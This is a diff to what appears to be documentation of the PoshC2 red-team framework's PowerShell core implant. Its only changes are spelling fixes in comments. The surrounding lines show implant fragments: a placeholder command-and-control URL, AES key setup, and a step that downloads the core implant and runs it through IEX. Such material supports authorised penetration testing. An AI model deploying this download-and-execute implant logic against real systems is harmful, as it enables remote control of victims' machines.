@@ -7,7 +7,7 @@ The following code contains the core implant which is the basis for all droppers
 	# PoshC2 Server Url
 	$s="https://www.example.com"
 
-	# creates a randon AES symetric encryption key
+	# creates a random AES symmetric encryption key
 	function CAM ($key,$IV){
 	  $a = New-Object -TypeName "System.Security.Cryptography.RijndaelManaged"
 	  $a.Mode = [System.Security.Cryptography.CipherMode]::CBC
@@ -122,7 +122,7 @@ The following code contains the core implant which is the basis for all droppers
 
 	$primer = primer
 
-	# once the core implant has been downloaded sucessfully pass to IEX
+	# once the core implant has been downloaded successfully pass to IEX
 	if ($primer) {
 		$primer | iex
 	} else {
